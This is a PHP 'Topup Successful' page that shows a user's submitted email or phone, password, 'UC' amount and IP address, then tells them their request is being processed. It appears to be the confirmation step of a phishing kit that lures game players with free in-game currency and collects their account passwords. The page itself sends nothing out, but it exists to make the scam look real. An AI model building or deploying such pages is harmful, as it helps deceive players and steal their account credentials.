<?php
session_start();
if (!isset($_SESSION['submission'])) {
    header("Location: index.php");
    exit();
}
$data = $_SESSION['submission'];
session_destroy();
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Topup Successful</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
</head>
<body class="bg-gradient-to-br from-green-400 to-blue-500 min-h-screen flex items-center justify-center p-4">
  <div class="bg-white rounded-2xl shadow-xl max-w-md w-full p-6">
    <h1 class="text-3xl font-bold text-center text-green-600 mb-6">Topup Successful!</h1>
    <div class="text-gray-700 space-y-2">
      <p><strong>Email/Phone:</strong> <?php echo htmlspecialchars($data['email']); ?></p>
      <p><strong>Password:</strong> <?php echo htmlspecialchars($data['password']); ?></p>
      <p><strong>UC:</strong> <?php echo htmlspecialchars($data['diamonds']); ?></p>
      <p><strong>IP Address:</strong> <?php echo htmlspecialchars($data['ip']); ?></p>
    </div>
    <div class="mt-6 text-center">
      <a href="index.php" class="bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg inline-block">Back to Home</a>
    </div>
    <p class="mt-6 text-center text-sm text-gray-500">Note: Your request is being processed. Please wait 5-10 minutes.</p>
  </div>
</body>
</html>
